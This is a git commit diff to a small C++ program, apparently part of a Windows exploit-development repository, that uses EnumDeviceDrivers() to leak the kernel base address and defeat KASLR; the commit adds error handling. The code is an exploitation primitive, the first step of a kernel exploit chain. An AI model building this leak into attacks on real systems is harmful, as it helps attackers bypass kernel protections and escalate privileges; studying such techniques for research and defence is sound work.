2ea1c64fcfbe556d8362a270f81df3a8d3b80582
FULLSHADE <54753063+FULLSHADE@users.noreply.github.com>
2020-05-27 19:48:07 -0400

    Update EnumDeviceDrivers_Leak.cpp

--- All_Versions/EnumDeviceDrivers_Leak.cpp
+++ All_Versions/EnumDeviceDrivers_Leak.cpp
@@ -4,18 +4,28 @@
 
 int main() {
 
-	std::cout << "[+] Preparing KASLR information leak with EnumDeviceDrivers()\n";
-
 	LPVOID drivers[1024];
 	DWORD cbNeeded;
 
-	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
-	PVOID KernelBaseAddress = { 0 };
-
+	BOOL enumVar = EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
+	std::cout << "[+] Preparing KASLR information leak with EnumDeviceDrivers()\n";
 	std::cout << "[+] Getting kernel base address\n";
+	PVOID KernelBaseAddress = { 0 };
 	KernelBaseAddress = drivers[0];
-	std::cout << "[+] Successfully leaked the kernel base address\n";
-	std::cout << "\t[>] Kernel base address -  0x" << KernelBaseAddress << std::endl;
+
+	if (enumVar == 0) {
+
+		TCHAR  err[256];
+		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(),
+			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), err, 255, NULL);
+
+		std::cout << "kASLR leakage failed! - " << err << std::endl;
+		std::cout << "This probably means your of low integrity!\n";
+	}
+	else {
+		std::cout << "[+] Successfully leaked the kernel base address\n";
+		std::cout << "\t[>] Kernel base address -  0x" << KernelBaseAddress << std::endl;
+	}
 
 	return 0;
 }
